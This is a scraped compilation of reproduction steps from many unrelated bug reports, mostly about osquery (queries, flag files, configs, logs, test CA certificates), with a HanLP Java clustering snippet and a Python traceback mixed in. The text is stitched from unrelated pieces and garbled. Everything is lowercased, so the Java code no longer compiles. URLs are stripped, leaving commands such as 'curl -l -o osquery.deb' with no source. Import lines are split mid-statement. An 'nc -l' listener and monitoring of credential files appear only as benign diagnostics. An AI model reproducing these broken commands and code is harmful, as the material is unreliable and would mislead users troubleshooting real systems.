public static void main(string[] args) { string a = "select * from table;"; string b = "select * from table;"; string c = "select * from table where id = 100;"; string d = "select * from table;"; string e = "delete from table;"; string f = "update table set age = 1 where id = 9"; string g = "update table set age = 1 where id = 88"; string h = "update table set age = 1 where id = 10"; set<integer> set = new hashset<>(); list<string> list = new arraylist<>(); list.add(a); list.add(b); list.add(c); list.add(d); list.add(e); list.add(f); list.add(g); list.add(h); string[] array = list.toarray(new string[0]); set.add(0); set.add(1); set.add(3); set.add(5); set.add(6); set.add(7); system.out.println("================ =============="); clusteranalyzer<string> analyzer = new clusteranalyzer<>(); for (integer s: set) { analyzer.adddocument(string.valueof(s), array[s]); } // k et int k = 10; system.out.println(analyzer.kmeans(k)); system.out.println(); system.out.println(analyzer.repeatedbisection(k)); system.out.println(analyzer.repeatedbisection(1.0)); }
provide a reproducible test case that is the bare minimum necessary to generate the problem
python 3.7.5 (default, jan 6 2020, 17:18:04)
[clang 11.0.0 (clang-1100.0.33.16)] on darwin
type "help", "copyright", "credits" or "license" for more information.
>>> import hanlp
traceback (most recent call last): file "<stdin>", line 1, in <module> file "/users/user/.pyenv/versions/3.7.5/lib/python3.7/site-packages/hanlp/__init__.py", line 6, in <module> import hanlp.common file "/users/user/.pyenv/versions/3.7.5/lib/python3.7/site-packages/hanlp/common/__init__.py", line 4, in <module> from
import component file "/users/user/.pyenv/versions/3.7.5/lib/python3.7/site-packages/hanlp/common/component.py", line 17, in <module> from hanlp.common.structure import serializabledict file "/users/user/.pyenv/versions/3.7.5/lib/python3.7/site-packages/hanlp/common/structure.py", line 6, in <module> from hanlp.utils.io_util import save_json, save_pickle, load_pickle, load_json, filename_is_json file "/users/user/.pyenv/versions/3.7.5/lib/python3.7/site-packages/hanlp/utils/__init__.py", line 5, in <module> from
import rules file "/users/user/.pyenv/versions/3.7.5/lib/python3.7/site-packages/hanlp/utils/rules.py", line 3, in <module> from hanlp.utils.english_tokenizer import tokenize_english file "/users/user/.pyenv/versions/3.7.5/lib/python3.7/site-packages/hanlp/utils/english_tokenizer.py", line 12, in <module> from regex import compile, dotall, unicode, verbose
modulenotfounderror: no module named 'regex'
provide a reproducible test case that is the bare minimum necessary to generate the problem
import hanlp
syntactic_parser = hanlp.load(hanlp.pretrained.dep.ctb7_biaffine_dep_zh)
1) `osqueryd -s`
2) `select * from time`
initiate a file carve
have the server return an error when receiving a block.
**schedule** a query that makes a file carve.
ps c:\\users\ icholas> osqueryi --line "select serial,common_name from certificates limit 20;" serial = 7925771cc8f3de5f2b05317fb6334b56b452a44c
common_name = serial = 7925771cc8f3de5f2b05317fb6334b56b452a44c
common_name = serial = 01981e
common_name = serial = 709bc765134caf844c9638b1acec6ac4
common_name = serial = 4f7e6766b05148974bbbafba2b800b44
common_name = serial = 79ad16a14aa0a5ad4c7358f407132e65
common_name = serial = 00
common_name = serial = 37ac9e4cacdcdfae40a405f7d3ed966c
common_name = serial = 32f74d4bb82078bc4b22a3927b8c3381
common_name = serial = 00c1008b3c3c8811d13ef663ecdf40
common_name = serial = 788698e3fe5661a64bedc77fe26514a8
common_name = serial = 0f6b552f9ebf907b0f6629a9bdf4d8ce
common_name = serial = 3baabcb9b9b4ae9b4fb5ae77f45278b3
common_name = serial = 3f8bc8b5fc9fb29643b569d66c42e144
common_name = serial = 01
common_name = serial = 667e59fd5cdb938f403e98862a8d887b
common_name = serial = 5f6352514c1064a244e97b24d36cb370
common_name = serial = 4d9d7e8ba1fac49449003933e0d11f0a
common_name = serial = 1c9cdc299addacb2441e15e0f1dcda4e
common_name = serial = 28cc3a25bfba44ac449a9b586b4339aa
common_name =
example query to cause a crash:
```select data from windows_eventlog where xpath = 'event[system[eventid=4688]]';```
look at the number of events with `4624` as the eventid in both screenshots: ![image](
run `select * from windows_eventlog where channel='microsoft-windows-terminalservices-localsessionmanager/operational';`
the curl_certificate table will hang indefinitely if there's something listening that doesn't respond
in one terminal run `nc -l 5000` then issue the query: `osqueryi "select * from curl_certificate where hostname=\\"localhost:5000\\";"` osquery will hang waiting on more data from the tls handshake that will never come.
out of curiosity i tried just commenting out the `#define audit_filter_exclude` in libaudit.h, instead of updating the submodule
it got the compile to keep going, and maybe well enough to work.
install osquery (
enable windows powershell script block logging 3
subscribe to the channel with --windows_event_channels=microsoft-windows-powershell/operational
ensure default osquery.conf file has "feature_vectors" field.
in osquery.flags, ensure --config_path=c:\\program files\\osquery\\osquery.conf
from command prompt, run "c:\\program files\\osquery>osqueryd\\osqueryd.exe -s --flagfile osquery.flags --verbose"
run some powershell scripts
run query "select * from powershell_events;"
the user table can be easily joined to get more information from a sid an example of this being: ```
select registry.name, users.username from registry left join users on registry.name=users.uuid
where registry.path like 'hkey_local_machine\\software\\microsoft\\windows nt\\currentversion\\profilelist\\%' and registry.name like 's-%';
``` if ran with ```--planner``` you can see each call to the user table with the sid constraint
this will call netenumuser each time.
select chassistypes from chassis_info on windows
attempting to query azure_instance_metadata or azure_instance_tags
install and enable a safari extension, for example, lastpass:
confirm that extension is enabled in safari (safari -> preferences -> extensions)
open osquery (`osqueryd -s`) and run:
`select e.name, e.identifier, e.version, e.description, e.path, "safari" as browser from users u join safari_extensions e on e.uid = u.uid;`
i didn't attempt to reinstall any games for lutris
i did re-download the macos theme for gnome
i just wanted to try the theme out..
don't judge too harshly
git@github.com:b00merang-project/macos.git
osqueryi --line "select * from package_bom where path == \'/private/var/db/receipts/com.facebook.osquery.bom\';"
thrift: wed may 20 10:16:43 2020 tsocket::open() connect() <host: port: 0>connection refused
zsh: segmentation fault osqueryi --line ``` using `where path like` doesn't segfault.
osqueryi "select * from startup_items"
there are several ways to check this, but by having those platforms as a vm:
1) actually boot the system in the vm
2) run the following query in osquery `select * from uptime;` and note the times
3) pause or suspend/snapshot the vm
4) wait 1 minute
5) unpause the vm or restore the snapshot
6) run the query again at step 2 and note again the times or simply look at the implementation of getuptime:
#l23
from a fresh vm: ```
sudo apt update && sudo apt upgrade -y
curl -l -o osquery.deb
sudo dpkg -i osquery.deb
sudo mkdir /etc/systemd/system/osqueryd.service.d
cat << eof | sudo tee /etc/systemd/system/osqueryd.service.d/protectsystem.conf
protectsystem=strict
readwritepaths=/var/osquery /var/run /var/tmp /tmp eof
sudo systemctl daemon-reload
sudo systemctl start osqueryd
run a dummy process, eg: `python3 -m http.server` to create a process id `42071` in macos and `15791` in linux in this specific case
and then query the following:
select pid, name, cmdline, uid, elapsed_time from processes where name like "%python%";
`osqueryi "select name, version, path from chrome_extensions order by path;"`
$ cat /users/zwass/dev/test_osquery_default_interval.conf
{ "options": { "schedule_default_interval": "10", "logger_path": "/tmp/osquery.log", "verbose": true }, "schedule": { "query_1": { "query": "select 1", "removed": "false" }, "query_2": { "query": "select 2", "removed": "false" }, "query_3": { "query": "select 3", "removed": "false" } }
$ osqueryd --pidfile /tmp/osquery.pid --database_path /tmp/osquery.db --config_path /users/zwass/dev/test_osquery_default_interval.conf
e0322 15:36:22.157331 255141312 init.cpp:564] an error occured during extension manager startup: cannot create extension socket: /var/osquery/osquery.em
i0322 15:36:22.161319 255141312 options.cpp:100] verbose logging enabled by config option
i0322 15:36:22.161592 255141312 events.cpp:863] event publisher not enabled: openbsm: publisher disabled via configuration
i0322 15:36:22.161888 255141312 events.cpp:863] event publisher not enabled: scnetwork: publisher not used
i0322 15:36:22.161921 255141312 events.cpp:863] event publisher not enabled: event_tapping: publisher disabled via configuration
i0322 15:36:22.191043 255141312 main.cpp:103] not starting the distributed query service: distributed query service not enabled.
i0322 15:36:22.191053 235491328 events.cpp:784] starting event publisher run loop: diskarbitration
i0322 15:36:22.191059 236027904 events.cpp:784] starting event publisher run loop: fsevents
i0322 15:36:22.191072 236564480 events.cpp:784] starting event publisher run loop: iokit
(waited 30+ seconds from last log message before killing osquery)
run osqueryd in foreground with specific scheduled queries, with `--verbose` flag on.
# osqueryi --config_path /etc/osquery/osquery.conf --config_check --verbose
i0308 13:34:53.450268 61691 init.cpp:340] osquery initialized [version=4.2.0]
i0308 13:34:53.450357 61691 extensions.cpp:349] could not autoload extensions: failed reading: /etc/osquery/extensions.load
i0308 13:34:53.450424 61691 init.cpp:562] an error occured during extension manager startup: extensions disabled
i0308 13:34:53.450449 61691 auto_constructed_tables.cpp:93] removing stale atc entries
w0308 13:34:53.455595 61691 options.cpp:91] cannot set unknown or invalid flag: enable_monitor
using a virtual database
need help, type '.help'
osquery> ```
run `select * from chrome_extensions;` for easier debugging, limit by a single extension identifier like `select * from chrome_extensions where identifier='nmmhkkegccagdldgiimedpiccmgmieda';`
using osqueryi, run following query: `select * from processes;"
start osquery with the following flagfile:
--force=true
--host_identifier=hostname
--verbose=true
--debug --tls_server_certs=/etc/osquery/fleet.crt --enroll_secret_env=enroll_secret
--enroll_tls_endpoint=/api/v1/osquery/enroll --config_plugin=tls
--config_tls_endpoint=/api/v1/osquery/config
--config_refresh=30 --disable_distributed=false
--distributed_plugin=tls
--distributed_interval=30
--distributed_tls_max_attempts=3
--distributed_tls_read_endpoint=/api/v1/osquery/distributed/read
--distributed_tls_write_endpoint=/api/v1/osquery/distributed/write --logger_plugin=tls
--logger_tls_endpoint=/api/v1/osquery/log
--logger_tls_period=30
have the tls endpoint (fleet in this case) return the following config:
{ "decorators": { "load": [ "select uuid as host_uuid from system_info;", "select hostname as hostname from system_info;" ] }, "options": { "config_refresh": 3, "disable_distributed": false, "distributed_interval": 3, "distributed_plugin": "tls", "distributed_tls_max_attempts": 3, "logger_plugin": "tls", "logger_tls_endpoint": "/api/v1/osquery/log", "logger_tls_period": 3, "pack_delimiter": "/" }
users-mac:~ user$ sudo osqueryi \'select * from hash where path = "/private/var/db/dslocal/nodes/default/sqlindex"\' --json
run the following query in osqueryi:
select * from wifi_networks
configuring the "kafka_producer" in "logger_plugins" option and using ssl as protocol in "logger_kafka_brokers" causes the issue to appear.
here is an example configuration on ubuntu bionic:
$ osqueryi --line "select version from os_version;"
version = 18.04.3 lts (bionic beaver) $ cat /etc/osquery/osquery.flags --config_plugin=filesystem
--tls_server_certs=/etc/ssl/certs/ca-certificates.crt $ jq '.options.logger_plugin' /etc/osquery/osquery.conf
"kafka_producer,filesystem" $ jq \'.options.logger_kafka_brokers\' /etc/osquery/osquery.conf.d/logger_kafka.conf "ssl://broker01.example.com:9093,ssl://broker02.example.com:9093,ssl://broker03.example.com:9093"
hashicorp/bionic64 vagrant box
osquery 4.1.2 from upstream repo
certs generated on the fly: echo server using /logger using leaf osquery client given tls_server_certs path to root
osquery client sending logs:
$ wc -l /tmp/osquery-test.log
389 /tmp/osquery-test.log
jan 22 21:20:48 vagrant osqueryd[15177]: i0122 21:20:48.295653 15215 tls.cpp:253] tls/https post request to uri:
$ curl --cacert /tmp/root_ca.cert.pem
curl: (51) ssl: certificate subject name 'osquery-test-ca intermediate ca' does not match target host name 'localhost'
$ sudo cat /etc/osquery/osquery.flags
--disable_extensions=false
--disable_enrollment=true
--extensions_timeout=10
--extensions_interval=10
--extensions_autoload=/etc/osquery/extensions.load
--disable_tables=process_env
--database_path=/var/osquery/osquery.db/
--disable_watchdog=true
--extensions_default_index=false "options": { "audit_allow_config": "false", "audit_allow_fim_events": "false", "audit_allow_fork_process_events": "false", "audit_allow_process_events": "false", "audit_allow_selinux_events": "false", "audit_allow_sockets": "false", "audit_allow_user_events": "false", "audit_backlog_limit": "4096", "audit_backlog_wait_time": "0", "audit_force_reconfigure": "false", "audit_persist": "false", "buffered_log_max": "1000000", "database_path": "/var/osquery/osquery.db", "disable_audit": "true", "disable_enrollment": "true", "disable_events": "true", "disable_logging": "false", "enable_syslog": "false", "events_expiry": "1", "events_max": "100000", "events_optimize": "true", "logger_min_status": "1", "logger_plugin": "tls", "logger_tls_endpoint": "/logger", "logger_tls_period": "1", "read_max": "52428800", "tls_hostname": "localhost:1337", "tls_server_certs": "/tmp/root_ca.cert.pem", "utc": "false" },
server cert:
$ openssl x509 -in /tmp/ca.cert.pem -noout -text
certificate: data: version: 3 ( ) serial number: 75:c1:7e:0b:76:25:7c:ae:84:da:c7:3d:78:ab:52:7d:f5:23:af:e2 signature algorithm: sha256withrsaencryption issuer: cn = osquery-test-ca root ca validity not before: jan 22 21:13:04 2020 gmt not after : jan 21 21:13:04 2021 gmt subject: cn = osquery-test-ca intermediate ca subject public key info: public key algorithm: rsaencryption rsa public-key: (2048 bit) modulus: 00:bb:79:52:ec:b4:c2:c6:ee:06:66:92:b1:4a:f9: 4e:2b:26:02:63:47:c3:63:13:60:fa:13:97:11:a6: b7:4c:a0:50:58:3b:78:4c:54:96:d6:76:f3:eb:f5: b7:db:09:ed:ce:e8:f3:65:d5:b2:3d:4b:14:f0:dd: 37:4c:59:37:41:37:12:cc:ef:70:e8:4f:05:72:e9: f3:96:9e:e1:77:9c:1b:f0:26:17:d3:55:00:97:a6: 72:03:95:a8:09:4c:f3:81:57:37:f7:d8:1a:a3:ec: da:60:b4:51:5c:2c:bb:4d:93:01:26:69:c4:c9:b6: 83:a3:ce:4b:26:82:e2:1f:d7:2e:1f:eb:bc:a3:ad: c3:08:29:94:51:47:6c:c7:ca:92:40:25:ca:1b:8b: 3d:9e:a8:4f:d2:5b:cf:b8:a0:28:32:9b:79:36:5f: bc:3b:71:62:03:dc:fd:1b:83:54:06:0e:95:8d:3b: ca:80:60:2c:62:17:b1:75:cb:3a:7d:b3:15:74:87: 0c:4d:38:fc:09:79:5e:63:4e:14:a2:28:5f:6c:de: f5:0c:3b:2d:dd:a4:43:1f:40:65:3b:7f:b3:7c:40: c7:3f:57:81:45:e0:cc:a9:c6:86:31:84:19:9a:57: f3:50:2c:e2:7a:5c:df:5d:7a:e7:ec:8d:ac:a7:5d: ef:85 exponent: 65537 ( ) x509v3 extensions: x509v3 basic constraints: critical ca:true, pathlen:1 x509v3 key usage: critical digital signature, certificate sign, crl sign signature algorithm: sha256withrsaencryption 6b:f9:7b:cf:57:20:5e:32:bd:67:85:ad:83:1b:99:ad:bb:f1: 87:b8:40:3d:2c:5c:8d:b3:87:30:62:32:47:51:8f:37:3a:db: a9:6d:a0:09:66:ee:bf:2b:bf:d3:5d:c7:80:6a:5d:9e:db:c3: d0:9a:33:47:4e:a0:83:21:12:5c:a2:84:a3:8c:ca:a2:0e:29: 2b:58:0b:ec:67:e0:05:d6:19:03:e7:4a:53:2b:ec:60:dc:3a: bc:07:62:cf:62:89:f0:f0:82:c8:ab:92:d2:42:50:c2:5c:c1: 5f:19:c7:c5:ac:b3:37:94:e7:56:bf:bf:73:6a:45:e6:1c:dd: b9:72:95:05:fd:c0:e1:d5:69:ea:7b:cb:3f:7f:89:e4:81:b7: 22:20:27:23:eb:88:93:d1:90:48:bf:b5:fd:42:14:37:5d:7d: d5:70:83:1e:35:db:7b:4a:45:b0:aa:d6:0b:34:2a:62:96:08: 9c:39:c7:12:ee:4b:a8:f3:46:c8:5a:2b:51:31:7c:41:1c:f5: 44:bb:d1:51:d0:dd:f1:69:c9:ba:3c:14:41:76:d6:eb:87:b1: 72:d5:13:39:3c:8d:c3:66:96:b3:51:d9:f8:f8:a5:a2:e8:df: 56:99:f0:cd:30:bf:ea:ec:5a:74:a2:48:81:69:26:6f:3a:09: 89:14:98:b2
$ openssl x509 -in /tmp/root_ca.cert.pem -noout -text
certificate: data: version: 3 ( ) serial number: 07:3f:94:58:91:aa:ea:b0:29:02:81:79:79:8d:c5:1f:ac:2c:33:fa signature algorithm: sha256withrsaencryption issuer: cn = osquery-test-ca root ca validity not before: jan 22 21:13:04 2020 gmt not after : jan 21 21:13:04 2021 gmt subject: cn = osquery-test-ca root ca subject public key info: public key algorithm: rsaencryption rsa public-key: (2048 bit) modulus: 00:a3:f7:ac:28:a5:d7:1a:04:81:c9:c1:ff:9d:51: b7:2d:1c:9f:fd:34:49:5e:dd:fc:98:3e:7d:3c:28: c0:d7:6e:34:ea:d7:6e:56:50:66:e6:53:d6:b4:8c: e3:13:93:1a:a2:76:9e:7e:63:e2:56:97:39:c2:33: 66:9d:96:09:b0:98:65:c5:57:6b:bd:94:8f:ba:97: 63:01:5d:19:50:15:86:72:db:51:0b:36:6b:06:83: 47:ad:17:f3:8a:ec:96:76:6b:bf:41:26:61:b7:9e: 99:1a:94:7c:61:a2:53:9e:88:6a:82:de:6d:12:c0: 88:be:6c:d8:f6:c7:18:e1:9f:9d:a9:47:8d:67:e8: 33:0b:c4:10:7d:24:a2:92:8a:e5:84:7f:0a:94:88: fe:2e:79:a3:1b:aa:69:35:f2:f0:91:fb:25:d9:46: b7:5b:05:68:b9:a9:b7:e8:91:a5:96:be:f6:2a:2f: 6a:de:d9:fa:0c:29:37:3b:83:b7:5d:01:ad:53:c4: 6f:68:ab:61:e2:7a:f4:7d:5e:55:73:42:45:86:c0: 13:56:cb:c2:98:23:32:8b:d6:9f:f8:73:45:12:a8: c0:af:ea:b0:fe:05:15:cb:a9:58:13:a3:fd:d2:7f: 57:0e:d5:4b:53:ab:0f:82:c6:51:91:03:12:dd:bb: e0:b3 exponent: 65537 ( ) x509v3 extensions: x509v3 basic constraints: critical ca:true x509v3 key usage: critical digital signature, certificate sign, crl sign signature algorithm: sha256withrsaencryption 52:54:ea:53:58:35:85:f3:db:9a:7c:27:09:fe:44:50:db:7c: 8b:d0:56:2b:79:c4:da:71:9c:9f:4b:c1:4a:f5:cc:86:6a:bc: 5d:e7:97:2f:79:28:08:19:b0:5f:22:b1:c3:b8:49:89:c6:0a: 9f:3c:e0:76:9e:be:65:ef:76:e6:c6:9a:5c:b6:17:d2:24:da: 91:b1:17:58:85:1e:7c:65:c2:78:e6:de:67:5c:3c:0a:83:e4: 11:f0:79:bb:65:97:65:cf:b4:0c:73:42:a9:45:22:6b:4e:64: 30:b5:56:a5:dc:83:bb:27:ec:3b:e6:f5:1b:3f:8f:d0:6c:7f: b9:3b:b3:d7:4a:c9:47:af:c4:e8:4f:48:28:a2:40:53:10:b3: 76:77:83:91:6a:a3:9a:b6:0e:f5:f8:79:47:e8:54:d7:24:27: 97:04:94:37:c3:2d:fd:b5:fc:31:29:1d:71:1b:f6:a9:81:3f: d2:bc:ae:6b:d3:ed:5b:2c:14:f1:7f:af:36:20:d5:8b:b7:9d: 60:24:6b:5e:60:52:e0:8d:3f:ea:7e:b8:50:af:79:f0:8b:bd: a1:30:58:6b:88:62:87:8b:cc:cf:46:07:75:5e:7e:99:7a:2b: 9f:fb:dd:ca:70:57:f2:e3:da:d6:0e:05:c7:75:fc:c1:9e:9d: 08:82:3e:f4
tried using zentral to carve files from the hosts
install msi
launch osqueryi terminal session and run a valid mdfind query:
running a query against the ibridge_info table i discovered that results are only returned for t1 macbook pro's
select * from ibridge_info;
enable the config flag `--log_numerics_as_numbers`.
schedule a query that returns numbers (`select * from time`)
1.in this [page]( i know atom_packages can be supported by windows platform.
when i enter .tables, i failed to find the atom_packages table.
osquery.exe --verbose --disable_events=false
select keywords from windows_events;
* run osquery on aws where the ec2 instance has a role assigned to it which would allow pushes to firehose.
* do not supply any credentials to osquery (it should attempt to use ec2 metadata to determine creds as final fall through)
osquery> select * from hash;
it happens all the time on all my hosts.
ensure you have atom.app installed with some packages
open osqueryi 1
execute the query `select * from atom_packages;` (note the number of results)
execute the query `select * from atom_packages;` again.
--audit_force_reconfigure can cause stall linux system services e.g
sshd becomes unresponsive
please follow slack link below for more detail -
`>.\\osqueryi.exe --json "select * from bogus_table;"`
build example_extension from latest master (4.0.2) and setup extensions.load to point to the example_extension built with config_plugin as local filesystem and load it.
1) make sure that there is at least 1 extension in the `extensions.load` file
i used but any well-behaved extension should work to reproduce the issue.
2) stop the `osqueryd` service (if it is installed as a service)
3) from the command line, run the following query:
osqueryd.exe --s --verbose "select version from osquery_info;"
4) if the extension does not register before the query results come back, then the process terminates normally (so go back to step 3)
however, if the extension does register, then after query results are returned, the process just hangs and multiple `ctrl+c` key presses are required to terminate it.
while debugging an issue with table registering, i noticed that the following function
#l1013
was not logging a possible error of the create virtual table query:
#l1037-l1046
so i added some logging of the status and the errormsg from sqlite3_exec.
using trailofbits extension 1.2 (
extension listed in extensions.load file, which is set to autoload via cli flag
invocation: > osqueryi.exe --json --verbose --disable_extensions=false --extensions_autoload=extensions.load "select * from hostblacklist"
using trailofbits extension 1.2 (
extension listed in extensions.load file, which is set to autoload via cli flag
invocation:
> osqueryi.exe --json --verbose --disable_extensions=false --extensions_autoload=extensions.load --extensions_require=c:\\osquery_extension_testing\\tob.ext.exe "select * from hostblacklist"
the issue cannot be reproduced every time because it probably depends on hardware speed (cpu vs disk speed) and also if the file read has been cached somewhere
one way is to run configtests.test_pack_noninline, after a system reboot.
i used the script provided to create a custom msi file `make_windows_package.ps1` and installed osquery on my hosts.
then i tried to uninstall using the uninstall string and the msi itself (msi /uninstall)
also ran microsoft install and uninstall diagnostic tool.
rebooted the operating system, and ran the queries again
i have not been able to reproduce a crash myself
across our entire fleet macos systems we've seen around 30k osquery crashes since 01mar
those crashes are limited to 1k unique hosts
this is a significant portion of our fleet.
include `--disable_tables=processes` in `/etc/osquery/osquery.flags` then stop `osqueryd` and start it from cold.
run osqueryd with the `--verbose` flag enabled
start osquery with the `--verbose` flag.
add a log(info) statement to the virtual table you want to test and recompile (e.g
`log(info) << "genprocesses()"` in processes.cpp)
select count(1) from processes where path in ('a','b','c','d','e','f','g','h')
copy cmd.exe, run it, and then move it to another location:
copy c:\\windows\\system32\\cmd.exe bad.exe
mv bad.exe foo.exe
in services, stop osqueryd
open task manager, an osqueryd.exe process still exists
when uninstalling:
use wix to build an osquery msi with extensions included
install the osquery package on a windows 10 host
uninstall osquery from the control panel
confirm in task manager whether any osqueryd.exe processes remain
using the foobar_logger plugin
* the following `osquery.conf`
{ "options": { "disable_audit": false, "audit_allow_config": true, "audit_persist": true, "disable_events": "false", "logger_plugin": "foobar_logger", "config_plugin": "filesystem", "events_expiry": 1 }, "schedule": { "shell_history": { "query": "select * from shell_history join users on (uid);" "interval": 5 }, }
``` command line steps
root@vagrant:~# osqueryi
using a virtual database
need help, type '.help'
osquery> select * from users join shell_history using (uid);
thrift: thu dec 13 20:30:08 2018 tsocket::read() thrift_poll() interrupted system call
thrift: thu dec 13 20:30:08 2018 tconnectedclient died: unknown: interrupted system call
osquery> thrift: thu dec 13 20:30:12 2018 tsocket::open() connect() <host: port: 0>connection refused osquery> select * from users join shell_history using (uid);
thrift: thu dec 13 21:06:02 2018 tsocket::read() thrift_poll() interrupted system call
thrift: thu dec 13 21:06:02 2018 tconnectedclient died: unknown: interrupted system call
osquery> w1213 21:06:05.807510 2001 interface.cpp:83] refusing to register duplicate extension foobar_logger
traceback (most recent call last): file "/usr/local/bin/foobar_logger.ext", line 23, in <module> version="1.0.0",) file "/usr/local/lib/python2.7/dist-packages/osquery/management.py", line 238, in start_extension message=status.message,
osquery.extensions.ttypes.extensionexception: extensionexception(code=1, _message=u'duplicate extension registered', uuid=none)
thrift: thu dec 13 21:06:06 2018 tsocket::open() connect() <host: port: 0>connection refused
w1213 21:06:08.749032 1991 watcher.cpp:595] extension respawning too quickly: /usr/local/bin/foobar_logger.ext osquery>
set osquery.conf with views and a schedule d query on the view
conf file below.
delete osquery.db folder
run `osqueryd.exe` on command line
(same happens when run as service too)
this works.
ctrl-c to kill that osqueryd.exe
run `osqueryd.exe` on command line again
this time error on executing query on the view osquery.conf file:
c:\\programdata\\osquery\\osqueryd>type ..\\osquery.conf
{ "options": { "verbose": "true" }, "views": { "users_view": "select username, description, directory from users;" }, "schedule": { "users": { "query": "select * from users;", "interval": 30 }, "users_view": { "query": "select * from users_view;", "interval": 30 } }
i add a schedule query for osqueryd to collect disk size used by rocksdb :
select sum(size) as bytes_disk from file where path like '/var/osquery/osquery.db/%';
in order to reduce disk occupied by it, i add some limitations in osquery.flags:
![image]( but the result still turns out to be like this:
![image](
sudo apt install libc++abi-dev libc++-dev # installing these 2 packages for libc++ seems to break the build
apt list libc++abi-dev libc++-dev listing..
done libc++-dev/bionic,now 6.0-2 amd64 [installed] libc++abi-dev/bionic,now 6.0-2 amd64 [installed] git clone <osquery osquery url>
make sysprep
make gtest # fails for [gtest, gmock, gmock_main, gtest_main, linenoise-ng, osquery_extensions, osquery_tables_utility] and possibly other targets too
have, or edit, a kernel panic occurring on a weekend
/library/logs/diagnosticreports/kernel_2018-10-28-085150_username-macbookpro.panic
we use doorman as osquery server
i added a distributed query to one of my machines, but i got `pending` status.
![image](
here is my config:
{"/etc/osquery/osquery.conf.d/dev.conf": { "file_paths": { "etc": [ "/etc/oauth2_proxy.conf", "/etc/nginx/conf.d/%%", "/etc/nginx/nginx.conf", "/etc/nginx/local.conf" ], "var": [ "/var/lib/pgsql/10/data/pg_hba.conf", "/var/lib/pgsql/10/data/postgresql.conf" ] }
{"/etc/osquery/osquery.conf.d/iptables.conf": { "schedule": { "iptables": { "query": "select filter_name,policy,target,protocol,src_port,dst_port,src_ip,dst_ip,iniface,outiface,match from iptables;", "interval" : 60, "removed": false, "description": "retrieves the current filters and chains per filter in the target system." } } } }
{"/etc/osquery/osquery.conf.d/processaudit.conf": { "schedule": { "socket_events":{ "query": "select s.action, s.auid, s.family, s.local_address, s.local_port, s.path, s.pid, s.remote_address, s.remote_port, s.success, s.time, p.cmdline, p.cmdline_size, p.parent, p.uid, p.euid, ps.cmdline from socket_events s join process_events p on p.pid = s.pid join processes ps on ps.pid = p.parent where s.action=\'bind\';", "removed": false, "interval": 60 } #"process_events": { # "query": "select * from process_events;", # "removed": false, # "interval": 30 #} } } }
{"osquery.conf": { "file_paths": { "etc": [ "/etc/osquery/%%", "/etc/ssh/sshd_config", "/etc/group", "/etc/passwd", "/etc/gshadow", "/etc/shadow", "/etc/security/opasswd", "/etc/sudoers", "/etc/pam.d/%%", "/etc/security/limits.conf", "/etc/security/pam_env.conf", "/etc/security/namespace.conf", "/etc/security/namespace.init", "/etc/localtime", "/etc/hosts", "/etc/sudoers.d/%%", "/etc/yum.repos.d/%%", "/etc/yum.conf", "/etc/syslog-ng/%%" ], "home": [ "/home/%/.ssh/%%" ], "root": [ "/root/.ssh/%%" ] }, "schedule": { "file_events": { "query": "select * from file_events;", "removed": false, "interval": 30 } }, "events": { "disable_subscribers": ["user_events"] } }
here is what i did:
iptables -a in_public_allow -s 127.0.0.1 -j accept
``` results in 5 identical results:
{"name":"iptables","hostidentifier":"xxx","calendartime":"mon nov 12 17:31:45 2018 utc","unixtime":1542043905,"epoch":0,"counter":52,"columns":{"dst_ip":"0.0.0.0","dst_port":"","filter_name":"filter","iniface":"all","match":"yes","outiface":"all","policy":"","protocol":"0","src_ip":"127.0.0.1","src_port":"","target":"accept"},"action":"added"}
{"name":"iptables","hostidentifier":"xxx","calendartime":"mon nov 12 17:31:45 2018 utc","unixtime":1542043905,"epoch":0,"counter":52,"columns":{"dst_ip":"0.0.0.0","dst_port":"","filter_name":"filter","iniface":"all","match":"yes","outiface":"all","policy":"","protocol":"0","src_ip":"127.0.0.1","src_port":"","target":"accept"},"action":"added"}
{"name":"iptables","hostidentifier":"xxx","calendartime":"mon nov 12 17:31:45 2018 utc","unixtime":1542043905,"epoch":0,"counter":52,"columns":{"dst_ip":"0.0.0.0","dst_port":"","filter_name":"filter","iniface":"all","match":"yes","outiface":"all","policy":"","protocol":"0","src_ip":"127.0.0.1","src_port":"","target":"accept"},"action":"added"}
{"name":"iptables","hostidentifier":"xxx","calendartime":"mon nov 12 17:31:45 2018 utc","unixtime":1542043905,"epoch":0,"counter":52,"columns":{"dst_ip":"0.0.0.0","dst_port":"","filter_name":"filter","iniface":"all","match":"yes","outiface":"all","policy":"","protocol":"0","src_ip":"127.0.0.1","src_port":"","target":"accept"},"action":"added"}
{"name":"iptables","hostidentifier":"xxx","calendartime":"mon nov 12 17:31:45 2018 utc","unixtime":1542043905,"epoch":0,"counter":52,"columns":{"dst_ip":"0.0.0.0","dst_port":"","filter_name":"filter","iniface":"all","match":"yes","outiface":"all","policy":"","protocol":"0","src_ip":"127.0.0.1","src_port":"","target":"accept"},"action":"added"}
``` removing the rule just added, by doing this:
```iptables -d in_public_allow 4``` results in 4 duplicate results but the result corresponds to the last rule of the in_public_allow chain, rather than the rule i just deleted, see below: ```{"name":"iptables","hostidentifier":"xxx","calendartime":"mon nov 12 17:32:49 2018 utc","unixtime":1542043969,"epoch":0,"counter":53,"columns":{"dst_ip":"0.0.0.0","dst_port":"443:443","filter_name":"filter","iniface":"all","match":"yes","outiface":"all","policy":"","protocol":"6","src_ip":"myip","src_port":"0:65535","target":"accept"},"action":"added"}
{"name":"iptables","hostidentifier":"xxx","calendartime":"mon nov 12 17:32:49 2018 utc","unixtime":1542043969,"epoch":0,"counter":53,"columns":{"dst_ip":"0.0.0.0","dst_port":"443:443","filter_name":"filter","iniface":"all","match":"yes","outiface":"all","policy":"","protocol":"6","src_ip":"myip","src_port":"0:65535","target":"accept"},"action":"added"}
{"name":"iptables","hostidentifier":"xxx","calendartime":"mon nov 12 17:32:49 2018 utc","unixtime":1542043969,"epoch":0,"counter":53,"columns":{"dst_ip":"0.0.0.0","dst_port":"443:443","filter_name":"filter","iniface":"all","match":"yes","outiface":"all","policy":"","protocol":"6","src_ip":"myip","src_port":"0:65535","target":"accept"},"action":"added"}
{"name":"iptables","hostidentifier":"xxx","calendartime":"mon nov 12 17:32:49 2018 utc","unixtime":1542043969,"epoch":0,"counter":53,"columns":{"dst_ip":"0.0.0.0","dst_port":"443:443","filter_name":"filter","iniface":"all","match":"yes","outiface":"all","policy":"","protocol":"6","src_ip":"myip","src_port":"0:65535","target":"accept"},"action":"added"}
run the command - select * from prometheus_metrics;
run: `osqueryi -a routes` or any other command to access `routes` table
use a distributed setup with a discovery query
